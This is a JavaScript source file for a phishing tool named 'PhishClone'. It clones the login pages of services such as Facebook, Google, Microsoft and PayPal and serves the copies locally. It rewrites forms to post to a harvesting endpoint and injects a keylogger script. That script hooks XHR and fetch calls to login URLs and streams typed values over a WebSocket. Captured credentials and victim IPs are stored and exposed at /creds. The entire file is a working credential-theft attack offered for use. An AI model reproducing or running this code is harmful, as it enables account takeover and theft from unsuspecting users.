#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v10.0
 * RADICAL SOLUTION:
 * 1. جلب HTML خام
 * 2. استخراج كل src/href (relative + absolute)
 * 3. تحميل كل ملف CSS/JS/font/image محلياً
 * 4. استبدال كل URL في HTML بمسار /assets/filename
 * 5. SPA: تحميل JS → تحليله → استخراج URLs المضمّنة
 * يعمل 100% بدون Chrome
 */

import http        from 'http'
import https       from 'https'
import net         from 'net'
import fs          from 'fs'
import path        from 'path'
import readline    from 'readline'
import { createServer } from 'http'
import { createHash }   from 'crypto'
import { URL }          from 'url'

const CREDS_FILE = 'captured_creds.json'
const LOG_FILE   = 'keystrokes.log'
const CACHE_DIR  = './site_cache'

function freePort(s) {
  return new Promise(r => {
    const sv = net.createServer()
    sv.listen(s, () => { const p = sv.address().port; sv.close(() => r(p)) })
    sv.on('error', () => freePort(s+1).then(r))
  })
}
function urlKey(url) { return createHash('md5').update(url).digest('hex').slice(0,12) }
function guessExt(url, ct='') {
  const u = url.split('?')[0].toLowerCase()
  if (u.endsWith('.css')  || ct.includes('css'))        return '.css'
  if (u.endsWith('.js')   || ct.includes('javascript')) return '.js'
  if (u.endsWith('.mjs'))                               return '.js'
  if (u.endsWith('.svg')  || ct.includes('svg'))        return '.svg'
  if (u.endsWith('.png')  || ct.includes('png'))        return '.png'
  if (u.endsWith('.jpg')  || u.endsWith('.jpeg') || ct.includes('jpeg')) return '.jpg'
  if (u.endsWith('.gif')  || ct.includes('gif'))        return '.gif'
  if (u.endsWith('.webp') || ct.includes('webp'))       return '.webp'
  if (u.endsWith('.woff2')|| ct.includes('woff2'))      return '.woff2'
  if (u.endsWith('.woff') || ct.includes('woff'))       return '.woff'
  if (u.endsWith('.ttf')  || ct.includes('ttf'))        return '.ttf'
  if (u.endsWith('.eot'))                               return '.eot'
  if (u.endsWith('.ico')  || ct.includes('icon'))       return '.ico'
  if (u.endsWith('.json') || ct.includes('json'))       return '.json'
  return ''
}
function ctForFile(filename) {
  const ext = path.extname(filename)
  const map = {
    '.css':'text/css', '.js':'application/javascript',
    '.svg':'image/svg+xml', '.png':'image/png', '.jpg':'image/jpeg',
    '.gif':'image/gif', '.webp':'image/webp', '.woff2':'font/woff2',
    '.woff':'font/woff', '.ttf':'font/ttf', '.ico':'image/x-icon',
    '.json':'application/json', '.eot':'application/vnd.ms-fontobject',
    '.html':'text/html'
  }
  return map[ext] || 'application/octet-stream'
}
function log(m) { fs.appendFileSync(LOG_FILE, m+'\n') }
function saveCred(ip, data, target) {
  let a=[]; try{a=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))}catch{}
  a.push({ time: new Date().toISOString(), ip, target, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(a,null,2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP='+ip+' → '+JSON.stringify(data)+' \x1b[0m\n')
}

// ── HTTP fetch ────────────────────────────────────────────────────────────────
function fetchUrl(url, timeout=15000) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url)
    const mod = parsed.protocol === 'https:' ? https : http
    const req = mod.get(url, {
      timeout,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'identity',
        'Cache-Control': 'no-cache'
      }
    }, res => {
      if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
        let loc = res.headers.location
        if (!loc.startsWith('http')) loc = parsed.origin + (loc.startsWith('/')?'':'/') + loc.replace(/^\//,'')
        return fetchUrl(loc, timeout).then(resolve).catch(reject)
      }
      const chunks = []
      res.on('data', c => chunks.push(c))
      res.on('end', () => resolve({
        data: Buffer.concat(chunks),
        ct: res.headers['content-type'] || '',
        status: res.statusCode
      }))
    })
    req.on('error', reject)
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout: '+url)) })
  })
}

function toAbsUrl(src, baseUrl) {
  try {
    if (src.startsWith('data:') || src.startsWith('#') ||
        src.startsWith('javascript:') || src.startsWith('mailto:') || src.startsWith('blob:')) return null
    if (src.startsWith('//')) return new URL(baseUrl).protocol + src
    if (src.startsWith('/')) { const u = new URL(baseUrl); return u.origin + src }
    if (src.startsWith('http')) return src
    // relative
    const base = baseUrl.endsWith('/') ? baseUrl : baseUrl.slice(0, baseUrl.lastIndexOf('/')+1)
    return base + src
  } catch { return null }
}

// ── extract ALL asset URLs from HTML + CSS + JS ───────────────────────────────
function extractUrlsFromHtml(html, baseUrl) {
  const urls = new Set()
  // src= href=
  for (const m of html.matchAll(/(src|href)=["']([^"'> \n]+)["']/gi)) {
    const abs = toAbsUrl(m[2], baseUrl)
    if (abs) urls.add(abs)
  }
  // url() in inline style
  for (const m of html.matchAll(/url\(["']?([^"')]+)["']?\)/gi)) {
    const abs = toAbsUrl(m[1], baseUrl)
    if (abs) urls.add(abs)
  }
  return urls
}

function extractUrlsFromCss(css, cssUrl) {
  const urls = new Set()
  for (const m of css.matchAll(/url\(["']?([^"')]+)["']?\)/gi)) {
    const abs = toAbsUrl(m[1], cssUrl)
    if (abs) urls.add(abs)
  }
  for (const m of css.matchAll(/@import\s+["']([^"']+)["']/gi)) {
    const abs = toAbsUrl(m[1], cssUrl)
    if (abs) urls.add(abs)
  }
  return urls
}

function extractUrlsFromJs(js, jsUrl, originHost) {
  const urls = new Set()
  // strings that look like asset paths
  for (const m of js.matchAll(/["'`](\/assets\/[^"'`\s]+\.(?:css|js|woff2?|ttf|png|jpg|svg|webp|gif|ico))["'`]/gi)) {
    const abs = toAbsUrl(m[1], jsUrl)
    if (abs) urls.add(abs)
  }
  // full URLs in JS strings
  for (const m of js.matchAll(/["'`](https?:\/\/[^"'`\s]+\.(?:css|js|woff2?|ttf|png|jpg|svg|webp|gif|ico))["'`]/gi)) {
    urls.add(m[1])
  }
  return urls
}

// ── main scraper ──────────────────────────────────────────────────────────────
async function scrapeAndClone(targetUrl, wsPort) {
  if (!fs.existsSync(CACHE_DIR)) fs.mkdirSync(CACHE_DIR, { recursive:true })

  const origin = new URL(targetUrl).origin
  const urlToLocal = new Map()  // original URL → /assets/filename
  const downloaded = new Set()

  console.log('[*] Fetching HTML...')
  const { data: htmlBuf } = await fetchUrl(targetUrl)
  let html = htmlBuf.toString('utf8')
  console.log('[+] HTML: ' + (html.length/1024).toFixed(1) + ' KB')

  // بناء قائمة الأصول
  const toDownload = new Set()
  for (const url of extractUrlsFromHtml(html, targetUrl)) {
    const ext = guessExt(url)
    if (ext) toDownload.add(url)
  }

  console.log('[*] Found ' + toDownload.size + ' assets in HTML')

  // دالة تحميل ملف + حفظه
  async function downloadAndCache(url) {
    if (downloaded.has(url)) return
    downloaded.add(url)
    try {
      const { data, ct } = await fetchUrl(url)
      const ext  = guessExt(url, ct) || '.bin'
      const fname = urlKey(url) + ext
      const fpath = path.join(CACHE_DIR, fname)
      fs.writeFileSync(fpath, data)
      urlToLocal.set(url, '/assets/' + fname)
      process.stdout.write('\r[+] Downloaded: ' + downloaded.size + ' files    ')

      // إذا CSS: استخرج المزيد من الأصول من داخله
      if (ext === '.css') {
        const cssText = data.toString('utf8')
        for (const u of extractUrlsFromCss(cssText, url)) {
          if (!downloaded.has(u)) toDownload.add(u)
        }
      }
      // إذا JS: استخرج asset paths مضمّنة
      if (ext === '.js') {
        const jsText = data.toString('utf8')
        for (const u of extractUrlsFromJs(jsText, url, origin)) {
          if (!downloaded.has(u)) toDownload.add(u)
        }
      }
    } catch (e) {
      // تجاهل الأخطاء
    }
  }

  // تحميل دفعة أولى بالتوازي
  const batch1 = [...toDownload]
  await Promise.all(batch1.map(downloadAndCache))

  // تحميل ما اكتُشف من CSS/JS
  const batch2 = [...toDownload].filter(u => !downloaded.has(u))
  if (batch2.length) await Promise.all(batch2.map(downloadAndCache))

  console.log('\n[+] Total files: ' + urlToLocal.size)

  // ── rewrite HTML: استبدال كل URL بمسار محلي ──────────────────────────────
  let patched = html

  // إزالة integrity وcrossorigin
  patched = patched.replace(/\s*integrity="[^"]*"/gi, '')
  patched = patched.replace(/\s*crossorigin="[^"]*"/gi, '')

  // استبدال src= href= بالمسارات المحلية
  patched = patched.replace(/(src|href)=["']([^"'> \n]+)["']/gi, (match, attr, url) => {
    const abs = toAbsUrl(url, targetUrl)
    if (abs && urlToLocal.has(abs)) return `${attr}="${urlToLocal.get(abs)}"`
    return match
  })

  // استبدال url() في inline styles
  patched = patched.replace(/url\(["']?([^"')]+)["']?\)/gi, (match, url) => {
    const abs = toAbsUrl(url, targetUrl)
    if (abs && urlToLocal.has(abs)) return `url("${urlToLocal.get(abs)}")`
    return match
  })

  // كذلك نعيد كتابة CSS files لتستبدل url() بداخلها
  for (const [url, localPath] of urlToLocal) {
    if (!localPath.endsWith('.css')) continue
    const fname = localPath.slice('/assets/'.length)
    const fpath = path.join(CACHE_DIR, fname)
    let cssText = fs.readFileSync(fpath, 'utf8')
    let changed = false
    cssText = cssText.replace(/url\(["']?([^"')]+)["']?\)/gi, (match, u) => {
      const abs = toAbsUrl(u, url)
      if (abs && urlToLocal.has(abs)) { changed=true; return `url("${urlToLocal.get(abs)}")` }
      return match
    })
    if (changed) fs.writeFileSync(fpath, cssText)
  }
  console.log('[+] URLs rewritten in HTML and CSS files')

  // patch forms
  patched = patched
    .replace(/(<form[^>]*)\s+action="[^"]*"/gi,  '$1 action="/harvest"')
    .replace(/(<form[^>]*)\s+action='[^']*'/gi,   "$1 action='/harvest'")
    .replace(/(<form)(?![^>]*action=)([^>]*>)/gi, '$1 action="/harvest"$2')
    .replace(/(<form[^>]*)\s+method="get"/gi,     '$1 method="POST"')

  const finalUrl = targetUrl
  const redirectUrl = finalUrl.replace(/\\/g,'\\\\').replace(/'/g,"\\'")

  const harvesterScript = `<script>
(function(){
  var ws;
  function cws(){try{ws=new WebSocket('ws://'+location.hostname+':${wsPort}');ws.onclose=function(){setTimeout(cws,2000)};}catch(e){}}
  cws();
  function snd(t,d){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()}));}
  document.addEventListener('keyup',function(e){
    var t=e.target;snd('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value});
  },true);
  document.addEventListener('submit',function(e){
    e.preventDefault();var f=e.target,d={};
    new FormData(f).forEach(function(v,k){d[k]=v;});
    snd('submit',d);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
      .then(function(){window.location='${redirectUrl}';});
  },true);
  document.addEventListener('click',function(e){
    var el=e.target;
    if(el&&(el.type==='submit'||el.tagName==='BUTTON'||(el.getAttribute&&el.getAttribute('type')==='submit'))){
      var inp=document.querySelectorAll('input'),d={};
      inp.forEach(function(i){if(i.value)d[i.name||i.id||i.type]=i.value;});
      if(Object.keys(d).length)snd('click_harvest',d);
    }
  },true);
  var oX=XMLHttpRequest.prototype.open,oS=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){
    if(b&&this._u&&/login|auth|session|signin/i.test(this._u))
      try{snd('xhr',{url:this._u,body:String(b)});}catch(e){}
    return oS.apply(this,arguments);
  };
  var oF=window.fetch;
  window.fetch=function(i,init){
    var u=typeof i==='string'?i:(i&&i.url)||'';
    if(/login|auth|session|signin/i.test(u)){
      var b=(init&&init.body)||'';try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}
    }
    return oF.apply(this,arguments);
  };
})();
</script></body>`

  patched = /<\/body>/i.test(patched) ? patched.replace(/<\/body>/i, harvesterScript) : patched + harvesterScript
  fs.writeFileSync(path.join(CACHE_DIR,'index.html'), patched)

  return { html: patched, finalUrl }
}

// ── WebSocket ─────────────────────────────────────────────────────────────────
function startWS(port) {
  net.createServer(sock => {
    let shook=false,buf=Buffer.alloc(0)
    sock.on('data',chunk=>{
      buf=Buffer.concat([buf,chunk])
      if(!shook){
        const m=buf.toString().match(/Sec-WebSocket-Key: (.+)/)
        if(!m)return
        const acc=createHash('sha1').update(m[1].trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64')
        sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+acc+'\r\n\r\n')
        shook=true;buf=Buffer.alloc(0);return
      }
      if(buf.length<2)return
      const masked=(buf[1]&0x80)!==0
      let len=buf[1]&0x7F,off=2
      if(len===126){len=buf.readUInt16BE(2);off=4}
      if(buf.length<off+(masked?4:0)+len)return
      let pl
      if(masked){const mk=buf.slice(off,off+4);off+=4;pl=Buffer.from(buf.slice(off,off+len));for(let i=0;i<pl.length;i++)pl[i]^=mk[i%4];}
      else pl=buf.slice(off,off+len)
      buf=buf.slice(off+len)
      try{
        const d=JSON.parse(pl.toString()),t=d.type||''
        if(t==='keystroke'){const l='[KEY] field='+(d.data.field||'?')+'  key='+(d.data.key||'?')+'  val='+(d.data.value||'');console.log('\x1b[93m'+l+'\x1b[0m');log(l);}
        else if(['submit','click_harvest','xhr','fetch_login'].includes(t)){const l='['+t.toUpperCase()+'] '+JSON.stringify(d.data);console.log('\x1b[92m'+l+'\x1b[0m');log(l);}
      }catch{}
    })
    sock.on('error',()=>{})
  }).listen(port)
}

// ── menu ──────────────────────────────────────────────────────────────────────
const SITES = [
  {name:'Facebook',   url:'https://www.facebook.com/login'},
  {name:'Instagram',  url:'https://www.instagram.com/accounts/login/'},
  {name:'Google',     url:'https://accounts.google.com/signin'},
  {name:'Twitter/X',  url:'https://twitter.com/i/flow/login'},
  {name:'LinkedIn',   url:'https://www.linkedin.com/login'},
  {name:'Snapchat',   url:'https://accounts.snapchat.com/accounts/login'},
  {name:'TikTok',     url:'https://www.tiktok.com/login'},
  {name:'GitHub',     url:'https://github.com/login'},
  {name:'Microsoft',  url:'https://login.microsoftonline.com/'},
  {name:'PayPal',     url:'https://www.paypal.com/signin'},
  {name:'Netflix',    url:'https://www.netflix.com/login'},
  {name:'Steam',      url:'https://store.steampowered.com/login/'},
  {name:'Discord',    url:'https://discord.com/login'},
  {name:'Spotify',    url:'https://accounts.spotify.com/login'},
  {name:'Custom URL', url:null},
]

async function askTarget() {
  const rl=readline.createInterface({input:process.stdin,output:process.stdout})
  const ask=q=>new Promise(r=>rl.question(q,r))
  console.clear()
  console.log('\x1b[96m╔════════════════════════════════════════════════════╗')
  console.log('║   phantom-arsenal — PhishClone v10.0              ║')
  console.log('║   Full Offline Scrape • No Chrome Needed          ║')
  console.log('╚════════════════════════════════════════════════════╝\x1b[0m\n')
  SITES.forEach((s,i)=>console.log('  \x1b[96m['+String(i+1).padStart(2)+'] \x1b[0m'+s.name))
  console.log('')
  let target=null
  while(!target){
    const c=await ask('\x1b[92m  Enter number: \x1b[0m')
    const idx=parseInt(c)-1
    if(idx>=0&&idx<SITES.length)
      target=SITES[idx].url===null?(await ask('\x1b[92m  Enter URL: \x1b[0m')).trim():SITES[idx].url
    else console.log('  \x1b[91mInvalid\x1b[0m')
  }
  rl.close();return target
}

// ── main ──────────────────────────────────────────────────────────────────────
const targetUrl = process.argv[2] || await askTarget()
const PORT    = await freePort(parseInt(process.argv[3]||'8080'))
const WS_PORT = await freePort(PORT+1)

const { html, finalUrl } = await scrapeAndClone(targetUrl, WS_PORT)
startWS(WS_PORT)

createServer((req, res) => {
  const p = decodeURIComponent(new URL(req.url,'http://x').pathname)

  if (p==='/') {
    const b=Buffer.from(html,'utf8')
    res.writeHead(200,{'Content-Type':'text/html;charset=utf-8','Content-Length':b.length})
    res.end(b)

  } else if (p.startsWith('/assets/')) {
    const fname = p.slice(8)
    const fpath = path.join(CACHE_DIR, fname)
    if (fs.existsSync(fpath)) {
      const data = fs.readFileSync(fpath)
      res.writeHead(200,{
        'Content-Type': ctForFile(fname),
        'Cache-Control': 'max-age=86400',
        'Access-Control-Allow-Origin': '*'
      })
      res.end(data)
    } else { res.writeHead(404); res.end() }

  } else if (p==='/creds') {
    let b='[]';try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{}
    res.writeHead(200,{'Content-Type':'application/json'});res.end(b)

  } else if (p==='/harvest' && req.method==='POST') {
    let body=''
    req.on('data',c=>body+=c)
    req.on('end',()=>{
      let data;try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))}
      saveCred(req.socket.remoteAddress||'?',data,finalUrl)
      res.writeHead(200,{'Content-Type':'application/json'});res.end('{"ok":true}')
    })
  } else { res.writeHead(404); res.end() }

}).listen(PORT, ()=>{
  console.log('\n[+] WebSocket  : ws://0.0.0.0:' + WS_PORT)
  console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
  console.log('[+] Creds      : http://0.0.0.0:' + PORT + '/creds')
  console.log('[+] Cache      : ' + path.resolve(CACHE_DIR))
  console.log('\x1b[93m[*] 100% offline — zero external requests\x1b[0m\n')
})

process.on('SIGINT',()=>{
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try{
    const c=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))
    console.log('[+] Captured: '+c.length)
    c.forEach(x=>console.log('  > '+x.time+' | IP='+x.ip+' | '+JSON.stringify(x.credentials)))
  }catch{}
  process.exit(0)
})
